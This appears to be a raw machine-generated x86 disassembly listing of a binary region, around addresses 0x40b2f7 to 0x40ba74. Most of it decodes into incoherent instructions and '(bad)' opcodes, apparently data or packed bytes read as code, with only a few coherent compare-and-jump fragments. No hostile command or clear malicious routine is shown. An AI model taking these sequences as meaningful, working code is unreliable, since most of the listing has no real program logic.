  40b2f7:	dec    ebx
  40b2f8:	outs   dx,DWORD PTR ds:[esi]
  40b2f9:	out    dx,eax
  40b2fa:	xchg   ecx,eax
  40b2fb:	add    eax,0x6737e840
  40b300:	dec    ebp
  40b301:	sti    
  40b302:	mov    esi,ss
  40b304:	in     eax,dx
  40b305:	xchg   BYTE PTR [edi+eax*1-0x69041c34],al
  40b30c:	adc    BYTE PTR [esi+0x76337d0b],bh
  40b312:	leave  
  40b313:	jb     0x40b2a6
  40b315:	and    ebp,DWORD PTR [esi+0x2886bd69]
  40b31b:	xor    ah,BYTE PTR [edx]
  40b31d:	adc    al,0xcd
  40b31f:	(bad)  
  40b321:	mov    BYTE PTR [edi+0x6a0837ae],ah
  40b327:	inc    ecx
  40b328:	fwait
  40b329:	cmp    DWORD PTR [eax],ebp
  40b32b:	fs dec ecx
  40b32d:	pop    edx
  40b32e:	sub    bl,ah
  40b330:	mov    BYTE PTR [edx+0x28],dl
  40b333:	add    esi,DWORD PTR [ecx]
  40b335:	push   ebp
  40b336:	cmp    BYTE PTR [edx],al
  40b338:	sar    dl,1
  40b33a:	push   esi
  40b33b:	pop    ecx
  40b33c:	sbb    eax,0xa4496127
  40b341:	mov    DWORD PTR [edi-0x1aca5a8b],0xee28399b
  40b34b:	and    DWORD PTR [edi+0x67788a28],edx
  40b351:	enter  0xa528,0x6c
  40b355:	and    ebp,DWORD PTR [ebp+0x3e26e304]
  40b35b:	cmp    al,0x6c
  40b35d:	jge    0x40b2e1
  40b35f:	push   eax
  40b360:	vpxor  xmm3,xmm5,XMMWORD PTR [edi+0x5a]
  40b365:	push   esp
  40b366:	test   al,0xf3
  40b368:	cmc    
  40b369:	mov    ecx,0xfe50428f
  40b36e:	pushf  
  40b36f:	jne    0x40b3b4
  40b371:	ret    
  40b372:	sbb    al,0xb9
  40b374:	jne    0x40b3cc
  40b376:	test   BYTE PTR [edx+eax*1],0x2
  40b37a:	and    ecx,DWORD PTR [esi]
  40b37c:	aas    
  40b37d:	and    eax,0x86a23626
  40b382:	pop    ds
  40b383:	pop    eax
  40b384:	cmp    bh,BYTE PTR [ebx-0x185e5d8b]
  40b38a:	repz in al,0x20
  40b38d:	dec    ebx
  40b38e:	pop    ebx
  40b38f:	dec    edx
  40b390:	dec    ebx
  40b391:	paddq  mm4,QWORD PTR [eax+0x22]
  40b395:	inc    ecx
  40b396:	in     eax,0xc5
  40b398:	sbb    eax,0xf6c31bfe
  40b39d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b39e:	jnp    0x40b325
  40b3a0:	iret   
  40b3a1:	fidiv  DWORD PTR [ebp+0x7a567f02]
  40b3a7:	mov    edi,0x1713e6df
  40b3ac:	pushf  
  40b3ad:	test   al,0x1a
  40b3af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3b0:	dec    esi
  40b3b1:	in     eax,0x97
  40b3b3:	bound  eax,QWORD PTR [ebp-0x6b]
  40b3b6:	mov    ch,0xfe
  40b3b8:	aas    
  40b3b9:	push   ss
  40b3ba:	enter  0x982,0x82
  40b3be:	ss mov ebx,0x650524b3
  40b3c4:	pushf  
  40b3c5:	xchg   ecx,eax
  40b3c6:	std    
  40b3c7:	rcl    DWORD PTR [ebx+0x6d63088a],cl
  40b3cd:	mov    dh,0xe0
  40b3cf:	and    al,0x7e
  40b3d1:	clc    
  40b3d2:	xlat   BYTE PTR ds:[ebx]
  40b3d3:	or     ebp,ebp
  40b3d5:	cmp    BYTE PTR [ebx+eax*8-0x5892f292],dl
  40b3dc:	dec    esp
  40b3dd:	jg     0x40b3f7
  40b3df:	or     BYTE PTR [edi],0xcc
  40b3e2:	add    ebp,DWORD PTR [esi+0x1c]
  40b3e5:	cli    
  40b3e6:	test   eax,esi
  40b3e8:	dec    ebx
  40b3e9:	fidiv  WORD PTR [edi+0x65074a7d]
  40b3ef:	sbb    al,0xe0
  40b3f1:	jae    0x40b42d
  40b3f3:	mov    al,0x9f
  40b3f5:	dec    edi
  40b3f6:	mov    BYTE PTR [edi+0x5],0xe1
  40b3fa:	js     0x40b427
  40b3fc:	sub    al,dh
  40b3fe:	ror    DWORD PTR [eax],1
  40b400:	mov    esp,0x26949fe7
  40b405:	stc    
  40b406:	shl    BYTE PTR [ebp-0x389a3fd8],cl
  40b40c:	je     0x40b421
  40b40e:	adc    BYTE PTR [eax+0x57],cl
  40b411:	and    ecx,DWORD PTR [ebx+0xff904fd]
  40b417:	lds    esp,FWORD PTR [eax-0x7556ac5d]
  40b41d:	(bad)  
  40b41e:	bound  ebp,QWORD PTR [eax+0x6c]
  40b421:	and    DWORD PTR [edi+0x1e],0xd68c7c1c
  40b428:	push   esi
  40b429:	mov    cl,0xec
  40b42b:	outs   dx,DWORD PTR ds:[esi]
  40b42c:	push   eax
  40b42d:	mov    eax,0x726e3811
  40b432:	pop    ebp
  40b433:	test   al,0x85
  40b435:	or     DWORD PTR [ebp-0x41],eax
  40b438:	push   ecx
  40b439:	adc    ebp,DWORD PTR [ebx+0x71cee738]
  40b43f:	inc    edx
  40b440:	ins    BYTE PTR es:[edi],dx
  40b441:	dec    esp
  40b442:	in     eax,dx
  40b443:	jp     0x40b42e
  40b445:	xchg   edx,eax
  40b446:	(bad)  
  40b447:	cmp    al,0xb
  40b449:	push   cs
  40b44a:	sbb    DWORD PTR [edi+0x23b8556c],ebp
  40b450:	stos   BYTE PTR es:[edi],al
  40b451:	xchg   esi,eax
  40b452:	in     al,0x6a
  40b454:	mov    bh,0x31
  40b456:	test   BYTE PTR [eax-0x4c],cl
  40b459:	add    DWORD PTR [edi],esi
  40b45b:	sub    DWORD PTR [edi+0x6bf33fc],ebp
  40b461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b462:	mov    BYTE PTR [eax-0x10],bl
  40b465:	js     0x40b4ca
  40b467:	jae    0x40b484
  40b469:	out    0x95,eax
  40b46b:	dec    ebp
  40b46c:	xlat   BYTE PTR ds:[ebx]
  40b46d:	pop    es
  40b46e:	cs sbb al,0x23
  40b471:	mov    ebp,0x99a0e3d
  40b476:	(bad)  
  40b477:	stos   DWORD PTR es:[edi],eax
  40b478:	jmp    0x29c37188
  40b47d:	icebp  
  40b47e:	adc    cl,BYTE PTR [esi+0x69]
  40b481:	dec    ebp
  40b482:	push   esp
  40b483:	int    0x27
  40b485:	pop    edx
  40b486:	adc    eax,0x8bc28d44
  40b48b:	adc    edi,esi
  40b48d:	pop    ds
  40b48e:	xchg   ebx,eax
  40b48f:	jl     0x40b4f2
  40b491:	lahf   
  40b492:	inc    esi
  40b493:	pop    ecx
  40b494:	aas    
  40b495:	iret   
  40b496:	ja     0x40b46f
  40b498:	xchg   ecx,eax
  40b499:	xor    ch,BYTE PTR [ecx-0x6eb293c2]
  40b49f:	pop    esi
  40b4a0:	das    
  40b4a1:	pmullw mm1,QWORD PTR [ecx+0x2c]
  40b4a5:	mov    DWORD PTR [esi-0x2a163f21],esp
  40b4ab:	sub    DWORD PTR [eax-0x4d],ecx
  40b4ae:	in     al,dx
  40b4af:	cmp    eax,0xb23a6ad1
  40b4b4:	ror    esp,1
  40b4b6:	call   0xefe2:0xad1b3b57
  40b4bd:	xor    cl,BYTE PTR [eax-0x75911243]
  40b4c3:	mov    BYTE PTR [ebp+0x6d],dl
  40b4c6:	jno    0x40b50b
  40b4c8:	call   0x3e7d:0xbb0472a8
  40b4cf:	iret   
  40b4d0:	jl     0x40b4b4
  40b4d2:	loopne 0x40b537
  40b4d4:	cdq    
  40b4d5:	rol    BYTE PTR [ecx-0x11],1
  40b4d8:	adc    eax,0xcddd8e9
  40b4dd:	ins    DWORD PTR es:[edi],dx
  40b4de:	test   eax,0xd2409059
  40b4e3:	(bad)  
  40b4e4:	std    
  40b4e5:	add    eax,DWORD PTR [edi]
  40b4e7:	inc    edx
  40b4e8:	or     al,0x21
  40b4ea:	push   ebp
  40b4eb:	jbe    0x40b55a
  40b4ed:	int    0x46
  40b4ef:	call   0xf578:0x612af628
  40b4f6:	cwde   
  40b4f7:	dec    ebp
  40b4f8:	push   esp
  40b4f9:	mov    bl,BYTE PTR [eax]
  40b4fb:	pop    ebx
  40b4fd:	pop    edx
  40b4fe:	in     eax,dx
  40b4ff:	pop    edi
  40b500:	pop    ebp
  40b501:	pop    eax
  40b502:	shr    BYTE PTR [edi-0x6dc8aa3],1
  40b508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b509:	ss daa 
  40b50b:	aaa    
  40b50c:	sbb    edi,DWORD PTR [edx-0x13309e29]
  40b512:	div    BYTE PTR [ecx+0x3743c42b]
  40b518:	pop    edx
  40b519:	ss mov ebx,0xbf6b9e1
  40b51f:	ror    DWORD PTR [edi],0xaf
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	aam    0xef
  40b551:	jno    0x40b4f2
  40b553:	rol    DWORD PTR [esi+0x7d9f7070],0x70
  40b55a:	jo     0x40b4f8
  40b55c:	add    al,BYTE PTR [edi]
  40b55e:	nop
  40b55f:	mov    WORD PTR [esi-0x3f],?
  40b562:	test   BYTE PTR [esi+0x2d],dh
  40b565:	xchg   edi,eax
  40b566:	data16 cmc 
  40b568:	fisubr DWORD PTR [edi]
  40b56a:	pop    edx
  40b56b:	dec    ebp
  40b56c:	or     esp,0x93c4afd4
  40b572:	ror    BYTE PTR [ebx],cl
  40b574:	daa    
  40b575:	cmp    edx,eax
  40b577:	mov    BYTE PTR [esi+0x9],dl
  40b57a:	push   edx
  40b57b:	fsubr  DWORD PTR [edi]
  40b57d:	ins    BYTE PTR es:[edi],dx
  40b57e:	inc    eax
  40b57f:	ins    BYTE PTR es:[edi],dx
  40b580:	cmp    DWORD PTR [ebp-0x2ee0a063],esi
  40b586:	aaa    
  40b587:	xor    BYTE PTR [edx],al
  40b589:	test   BYTE PTR [esi-0x7c],ah
  40b58c:	(bad)  
  40b58e:	gs inc ecx
  40b590:	push   ds
  40b591:	addr16 mov eax,0x5c3dd265
  40b597:	pop    ebp
  40b598:	push   ebp
  40b599:	jecxz  0x40b5b1
  40b59b:	(bad)  
  40b59c:	jl     0x40b578
  40b59e:	sar    BYTE PTR [ecx+0x14ba908f],cl
  40b5a4:	in     eax,0x2c
  40b5a6:	add    esp,DWORD PTR [edi+0x5ecd26b2]
  40b5ac:	nop
  40b5ad:	add    BYTE PTR [ecx-0x6d1cdbc9],0x3e
  40b5b4:	mov    BYTE PTR [edx-0x496610bf],dh
  40b5ba:	fs xchg ecx,eax
  40b5bc:	lods   al,BYTE PTR ds:[esi]
  40b5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5be:	inc    eax
  40b5bf:	das    
  40b5c0:	push   cs
  40b5c1:	cmp    al,0x2c
  40b5c3:	(bad)  
  40b5c4:	loopne 0x40b62a
  40b5c6:	fdiv   QWORD PTR ds:0xd40d258
  40b5cc:	adc    DWORD PTR [edi-0x21],edi
  40b5cf:	pop    ebx
  40b5d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5d1:	inc    esi
  40b5d2:	xchg   ebx,eax
  40b5d3:	jmp    0x7373ea87
  40b5d8:	xlat   BYTE PTR ds:[ebx]
  40b5d9:	jns    0x40b5b9
  40b5db:	popa   
  40b5dc:	xchg   esp,eax
  40b5dd:	pop    ebp
  40b5de:	adc    al,0x5
  40b5e0:	(bad)  
  40b5e1:	cmc    
  40b5e2:	sub    DWORD PTR [ebp-0x21f6c25a],ecx
  40b5e8:	call   0x19bb5043
  40b5ed:	mov    dl,0xa9
  40b5ef:	inc    eax
  40b5f0:	or     DWORD PTR [ebp-0x646155b3],edi
  40b5f6:	cmp    eax,0xfc69f53f
  40b5fb:	xchg   ebp,eax
  40b5fc:	(bad)  
  40b5fe:	or     al,0xcf
  40b600:	imul   ebp,DWORD PTR [ecx-0x38],0x33a50284
  40b607:	and    eax,0x2d22ed2e
  40b60c:	dec    edx
  40b60d:	dec    ecx
  40b60e:	mov    bh,0x59
  40b610:	fsub   DWORD PTR [ecx-0x16]
  40b613:	popa   
  40b614:	push   ecx
  40b615:	mov    ah,0x75
  40b617:	jge    0x40b62d
  40b619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b61a:	sbb    DWORD PTR [esi+0x5eba7ec6],0x6684baad
  40b624:	rcl    DWORD PTR [ebp-0x78],0xc
  40b628:	mov    eax,0xa396540f
  40b62d:	mov    ds:0x86ba9c,al
  40b632:	call   0x5c766593
  40b637:	sub    eax,0xd244e863
  40b63c:	pushf  
  40b63d:	test   ch,al
  40b63f:	mov    dl,BYTE PTR [esi+edi*1+0x351b8db3]
  40b646:	or     DWORD PTR [ecx+0x4bbc7490],0x5fedbe71
  40b650:	mov    BYTE PTR [esi-0x3e],ah
  40b653:	ret    0x8891
  40b656:	adc    eax,0x79f2bd1d
  40b65b:	or     edx,DWORD PTR [ebx+0x16]
  40b65e:	test   al,cl
  40b660:	jne    0x40b6bd
  40b662:	cld    
  40b663:	mov    gs,WORD PTR [ecx]
  40b665:	popf   
  40b666:	call   0xf1a632ed
  40b66b:	(bad)  
  40b66c:	das    
  40b66d:	pop    ss
  40b66e:	jecxz  0x40b6dd
  40b670:	mov    eax,ds:0xb574c5de
  40b675:	sbb    DWORD PTR [ebp-0x4ac14d10],esp
  40b67b:	ins    DWORD PTR es:[edi],dx
  40b67c:	inc    edi
  40b67d:	mov    dl,0x1f
  40b67f:	in     eax,dx
  40b680:	add    esp,DWORD PTR [ecx-0x57]
  40b683:	mov    edi,0xb48f2d68
  40b688:	leave  
  40b689:	std    
  40b68a:	dec    ebp
  40b68b:	and    DWORD PTR [edi+0x5a],eax
  40b68e:	lock (bad) 
  40b690:	enter  0xb8fa,0x26
  40b694:	fstp   QWORD PTR [esi-0x1622309a]
  40b69a:	out    0xfb,al
  40b69c:	jmp    0xb5d2:0xf9c751ec
  40b6a3:	xchg   esi,eax
  40b6a4:	push   0x49
  40b6a6:	dec    edx
  40b6a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6a8:	push   ecx
  40b6a9:	xor    DWORD PTR [eax+0x67c33c16],esp
  40b6af:	call   0x4b2209e8
  40b6b4:	(bad)  
  40b6b5:	cmc    
  40b6b6:	pop    ds
  40b6b7:	(bad)  
  40b6b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6b9:	retf   0xfe1b
  40b6bc:	cmp    ebp,DWORD PTR [ecx]
  40b6be:	loop   0x40b64b
  40b6c0:	imul   esp,DWORD PTR ds:0x614f9ef,0x3d8ce2b6
  40b6cb:	mov    ch,0xe
  40b6cd:	cmp    al,0x71
  40b6cf:	add    ch,BYTE PTR [ecx]
  40b6d1:	out    0x4a,eax
  40b6d3:	xchg   BYTE PTR [eax+0x6c],ch
  40b6d6:	int3   
  40b6d7:	push   ebx
  40b6d8:	push   edx
  40b6d9:	shl    ecx,0xee
  40b6dc:	mov    eax,ds:0x3ba4dabf
  40b6e1:	imul   ebp,ecx,0xa0c2c12b
  40b6e7:	inc    ebp
  40b6e8:	xchg   DWORD PTR [ecx],edx
  40b6ea:	sahf   
  40b6eb:	jb     0x40b758
  40b6ed:	or     dl,dl
  40b6ef:	mov    edx,0xeda53b9d
  40b6f4:	mov    ebx,0x8f354523
  40b6f9:	ds xchg edi,ecx
  40b6fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6fd:	or     DWORD PTR [eax-0x10],eax
  40b700:	or     ah,ch
  40b702:	push   esi
  40b703:	push   edx
  40b704:	scas   eax,DWORD PTR es:[edi]
  40b705:	sub    al,0x88
  40b707:	xchg   edi,eax
  40b708:	or     dl,ch
  40b70a:	and    dl,BYTE PTR [edi+eiz*8+0x62]
  40b70e:	dec    ebx
  40b70f:	fnop   
  40b711:	es xchg esp,ebx
  40b714:	sbb    ecx,ebx
  40b716:	mov    dh,0xef
  40b718:	push   edx
  40b719:	gs mov ch,0x7
  40b71c:	inc    ebx
  40b71d:	int    0xdc
  40b71f:	mov    ?,ebx
  40b721:	test   DWORD PTR [eax],0x9b5de63e
  40b727:	ss into 
  40b729:	jmp    0x153f:0x2617f4ef
  40b730:	lods   eax,DWORD PTR ds:[esi]
  40b731:	ja     0x40b7ac
  40b733:	stc    
  40b734:	push   es
  40b735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b736:	mov    al,ds:0x4b97c06a
  40b73b:	loopne 0x40b6c0
  40b73d:	shl    eax,cl
  40b73f:	mov    ecx,0x91456530
  40b744:	popf   
  40b745:	retf   0x3e0a
  40b748:	push   esp
  40b749:	mov    ch,0x8a
  40b74b:	lods   al,BYTE PTR ds:[esi]
  40b74c:	ss pop ds
  40b74e:	mov    ebp,DWORD PTR [esi+0x1e945c19]
  40b754:	shr    dl,0x23
  40b757:	sub    eax,0xd53dc051
  40b75c:	in     al,dx
  40b75d:	inc    edi
  40b75e:	mov    DWORD PTR [esi+eax*2-0x64cfce93],ecx
  40b765:	adc    esp,edx
  40b767:	aaa    
  40b768:	push   edi
  40b769:	and    dh,BYTE PTR [esi]
  40b76b:	aad    0x6a
  40b76d:	fadd   QWORD PTR [ebx-0x29]
  40b770:	adc    DWORD PTR [ebp+0x6b],0xdf9cbf89
  40b777:	mov    dh,0x9
  40b779:	iret   
  40b77a:	(bad)  
  40b77b:	ja     0x40b73f
  40b77d:	push   esp
  40b77e:	mov    al,BYTE PTR [eax]
  40b780:	push   ebp
  40b781:	xor    al,0x43
  40b783:	int3   
  40b784:	mov    al,ds:0x47cfd20f
  40b789:	dec    esi
  40b78a:	ins    BYTE PTR es:[edi],dx
  40b78b:	bnd js 0x40b75c
  40b78e:	stos   DWORD PTR es:[edi],eax
  40b78f:	sbb    ebp,DWORD PTR [esi-0xbc5199e]
  40b795:	fcom   DWORD PTR [ebx+edx*2+0x5b]
  40b799:	xchg   edi,eax
  40b79a:	icebp  
  40b79b:	jbe    0x40b7ad
  40b79d:	icebp  
  40b79e:	cs arpl si,dx
  40b7a1:	lods   eax,DWORD PTR ds:[esi]
  40b7a2:	mov    ch,BYTE PTR [edx+0x18e599d2]
  40b7a8:	addr16 dec ebx
  40b7aa:	adc    eax,DWORD PTR [edi-0x51]
  40b7ad:	sbb    BYTE PTR [ebp+0x2e4e9466],ah
  40b7b3:	mov    ds:0xefd48071,al
  40b7b9:	aaa    
  40b7ba:	in     al,0x29
  40b7bc:	or     al,0x7f
  40b7be:	ins    DWORD PTR es:[edi],dx
  40b7bf:	push   0x400c8c5
  40b7c4:	dec    eax
  40b7c5:	ds stos BYTE PTR es:[edi],al
  40b7c7:	sub    BYTE PTR [ebp+0x30],0x35
  40b7cb:	ret    
  40b7cc:	cld    
  40b7cd:	iret   
  40b7ce:	mov    cl,0x39
  40b7d0:	cld    
  40b7d1:	cs nop
  40b7d3:	ficomp DWORD PTR [eax+ebx*2]
  40b7d6:	or     eax,0xdf15996a
  40b7db:	pop    ecx
  40b7dc:	sti    
  40b7dd:	or     al,0xb7
  40b7df:	sub    edx,DWORD PTR [ebx-0x35b06fb0]
  40b7e5:	js     0x40b80d
  40b7e7:	pop    ebp
  40b7e8:	lahf   
  40b7e9:	adc    eax,0xe34cfd89
  40b7ee:	mov    ds:0x694a7ed0,al
  40b7f3:	test   al,0x52
  40b7f5:	sub    BYTE PTR [edx],dh
  40b7f7:	or     BYTE PTR [bp+si-0xb],dh
  40b7fb:	es in  eax,dx
  40b7fd:	outs   dx,DWORD PTR ds:[esi]
  40b7fe:	add    edi,edi
  40b800:	push   es
  40b801:	not    ebx
  40b803:	mov    dl,0xf0
  40b805:	xor    al,0x63
  40b807:	jge    0x40b868
  40b809:	push   ebp
  40b80a:	sahf   
  40b80b:	jnp    0x40b83a
  40b80d:	out    0x10,al
  40b80f:	imul   esi,DWORD PTR [edi+edi*2],0x9cc63e15
  40b816:	lahf   
  40b817:	jmp    0xdc55:0xbc58aa63
  40b81e:	jge    0x40b7d7
  40b820:	mov    esi,0xaee11721
  40b825:	je     0x40b842
  40b827:	and    ebp,DWORD PTR [edx-0x4ef8eb2b]
  40b82d:	neg    DWORD PTR [eax+0x17]
  40b830:	daa    
  40b831:	test   al,0x63
  40b833:	das    
  40b834:	or     DWORD PTR [edx+ebx*4-0x76],ebx
  40b838:	sahf   
  40b839:	lods   eax,DWORD PTR ds:[esi]
  40b83a:	test   eax,0xc7abd501
  40b83f:	imul   DWORD PTR [esp+edx*1-0x473fb4bd]
  40b846:	ja     0x40b8b3
  40b848:	imul   ecx,edx,0xffffffc8
  40b84b:	mov    edx,0x2162e9d1
  40b851:	fsubr  st(7),st
  40b853:	(bad)  
  40b854:	jo     0x40b837
  40b856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b857:	sti    
  40b858:	xlat   BYTE PTR ds:[ebx]
  40b859:	add    eax,0x9b501691
  40b85e:	push   es
  40b85f:	mov    esp,0x9c393803
  40b864:	xchg   edi,eax
  40b865:	ss adc al,0x5f
  40b868:	sbb    DWORD PTR [esi-0x2b9e2e79],0x6faaa5d1
  40b872:	pop    esp
  40b873:	fld    QWORD PTR [eax+eiz*1]
  40b876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b877:	jecxz  0x40b82b
  40b879:	psrad  mm0,QWORD PTR [edi]
  40b87c:	int3   
  40b87d:	test   DWORD PTR [esi],ebp
  40b87f:	push   0xffffffae
  40b881:	scas   eax,DWORD PTR es:[edi]
  40b882:	test   al,0x61
  40b884:	adc    DWORD PTR [eax+0x3c7f0f6b],edi
  40b88a:	arpl   WORD PTR [edx],bp
  40b88c:	inc    eax
  40b88d:	dec    ecx
  40b88e:	sbb    ebx,esp
  40b890:	add    ecx,DWORD PTR [edi-0x292d559f]
  40b896:	cdq    
  40b897:	jns    0x40b8b4
  40b899:	scas   eax,DWORD PTR es:[edi]
  40b89a:	add    eax,DWORD PTR ds:0x70a82060
  40b8a0:	sub    eax,DWORD PTR [ebx+0x4d47a3b1]
  40b8a6:	pop    ss
  40b8a7:	adc    ecx,esp
  40b8a9:	pop    ss
  40b8aa:	stc    
  40b8ab:	sub    cl,BYTE PTR [ebp+0x66]
  40b8ae:	aas    
  40b8af:	shr    BYTE PTR [ebx+0x3cd391e5],0x1d
  40b8b6:	xchg   ebx,eax
  40b8b7:	(bad)  
  40b8b8:	int    0x47
  40b8ba:	jecxz  0x40b8b3
  40b8bc:	pop    ss
  40b8bd:	pop    esi
  40b8be:	add    al,0x3d
  40b8c0:	mov    eax,ds:0x544aafb8
  40b8c5:	xor    dl,BYTE PTR [eax]
  40b8c7:	adc    eax,0x75bee651
  40b8cc:	daa    
  40b8cd:	fsub   DWORD PTR gs:[eax]
  40b8d0:	jae    0x40b85d
  40b8d2:	push   0x205a7b2
  40b8d7:	mov    ah,0x1e
  40b8d9:	cli    
  40b8da:	cs sub eax,0x91e8195a
  40b8e0:	dec    edi
  40b8e1:	fdivr  QWORD PTR [ecx-0x3151b36e]
  40b8e7:	inc    ebp
  40b8e8:	push   eax
  40b8e9:	jmp    0x3573af6e
  40b8ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8ef:	jge    0x40b8fb
  40b8f1:	sti    
  40b8f2:	pop    ds
  40b8f3:	lods   eax,DWORD PTR ds:[esi]
  40b8f4:	mov    bh,0xfa
  40b8f6:	mov    edx,0xe4fd46d8
  40b8fb:	add    DWORD PTR [ebx-0x2fcc0383],ecx
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x14309905],cl
  40b949:	out    0xa7,eax
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b901
  40b954:	ja     0x40b8d8
  40b956:	add    DWORD PTR [bp+si-0x68],edi
  40b95a:	pop    ebp
  40b95b:	aam    0x6e
  40b95d:	fisubr DWORD PTR [esi]
  40b95f:	(bad)  
  40b960:	loop   0x40b927
  40b962:	mov    al,0xc9
  40b964:	jmp    0x33dc:0x566ae01d
  40b96b:	ret    0xd69d
  40b96e:	push   esp
  40b96f:	aam    0xd3
  40b971:	mov    DWORD PTR [eax-0x2d],ecx
  40b974:	add    bh,BYTE PTR [ecx+ebp*4+0x6f2ed246]
  40b97b:	aad    0xfc
  40b97d:	popf   
  40b97e:	frstor [ebx+ebp*4-0x63]
  40b982:	outs   dx,DWORD PTR ds:[esi]
  40b983:	xor    BYTE PTR [eax-0x3fa92527],dl
  40b989:	push   cs
  40b98a:	xor    al,0x95
  40b98c:	pop    edx
  40b98d:	retf   
  40b98e:	cmp    BYTE PTR [ebx],0x2f
  40b991:	xchg   edx,eax
  40b992:	xor    DWORD PTR [esi-0x1c],0xffffffec
  40b996:	jb     0x40b96c
  40b998:	pop    ecx
  40b999:	add    al,0xf8
  40b99b:	stc    
  40b99c:	push   esp
  40b99d:	pushf  
  40b99e:	cwde   
  40b99f:	push   esp
  40b9a0:	sbb    BYTE PTR [esi+0x4dbadd97],0x5
  40b9a7:	xlat   BYTE PTR ds:[ebx]
  40b9a8:	xchg   ebp,eax
  40b9a9:	mov    BYTE PTR [eax],dl
  40b9ab:	call   0x5772cb77
  40b9b0:	inc    esi
  40b9b1:	adc    al,0x2f
  40b9b3:	out    0x5e,al
  40b9b5:	les    eax,FWORD PTR [ebx-0x70]
  40b9b8:	mov    edi,0x97040708
  40b9bd:	pop    edx
  40b9be:	pop    ecx
  40b9bf:	mov    ah,0x6b
  40b9c1:	inc    ebp
  40b9c2:	pushf  
  40b9c3:	sbb    al,0x9
  40b9c5:	cmp    eax,eax
  40b9c7:	mov    edi,0xa552b5bd
  40b9cc:	sub    BYTE PTR [edi],bh
  40b9ce:	(bad)
  40b9d2:	out    0x35,al
  40b9d4:	fs ja  0x40ba2d
  40b9d7:	jae    0x40b95f
  40b9d9:	add    eax,0x6515b7c2
  40b9de:	ins    DWORD PTR es:[edi],dx
  40b9df:	test   eax,0x803354f
  40b9e4:	cmc    
  40b9e5:	fdivr  st,st(6)
  40b9e7:	xlat   BYTE PTR ds:[ebx]
  40b9e8:	jns    0x40b9cc
  40b9ea:	pop    ss
  40b9eb:	shl    BYTE PTR [ebx+0x8fe29ca],1
  40b9f1:	es addr16 icebp 
  40b9f4:	or     DWORD PTR [edx-0x78c96cdc],ebx
  40b9fa:	xor    BYTE PTR ds:[esi-0x53],0x17
  40b9ff:	xchg   ecx,eax
  40ba00:	cmc    
  40ba01:	adc    DWORD PTR ds:0xd217814e,edx
  40ba07:	jnp    0x40ba87
  40ba09:	je     0x40ba55
  40ba0b:	pop    ebx
  40ba0c:	jmp    FWORD PTR [eax+0xc]
  40ba0f:	mov    al,ds:0xd24c756c
  40ba14:	(bad)  
  40ba15:	test   al,0x48
  40ba17:	or     eax,0x2736f1ec
  40ba1c:	fs aas 
  40ba1e:	pop    es
  40ba1f:	clc    
  40ba20:	(bad)  
  40ba22:	aas    
  40ba23:	je     0x40ba63
  40ba25:	inc    ebp
  40ba26:	pop    ebp
  40ba27:	xor    DWORD PTR [edx-0x7b],0x57
  40ba2b:	xchg   ecx,eax
  40ba2c:	xor    eax,0xa7c2e0df
  40ba31:	(bad)  
  40ba32:	jmp    0x7bd3:0x7d769fa
  40ba39:	jmp    0x40b9f9
  40ba3b:	sahf   
  40ba3c:	mov    edx,0x5077be78
  40ba41:	mov    ebp,0xd9dcbea2
  40ba46:	jp     0x40b9f7
  40ba48:	adc    bl,BYTE PTR [edi-0x5e47ae31]
  40ba4e:	cdq    
  40ba4f:	xchg   esi,eax
  40ba50:	mov    esi,0x33edb495
  40ba55:	xchg   edi,eax
  40ba56:	sbb    ebp,DWORD PTR [esi-0x23]
  40ba59:	cli    
  40ba5a:	mov    al,ds:0xaaf85e7e
  40ba5f:	sti    
  40ba60:	iret   
  40ba61:	cmovo  esp,DWORD PTR [edi]
  40ba64:	aaa    
  40ba65:	xor    ah,al
  40ba67:	out    dx,eax
  40ba68:	inc    eax
  40ba69:	iret   
  40ba6a:	ret    
  40ba6b:	loope  0x40ba26
  40ba6d:	mov    ecx,0x7fcd3b63
  40ba72:	jb     0x40ba61
  40ba74:	mov    edi,0xcc380cc9
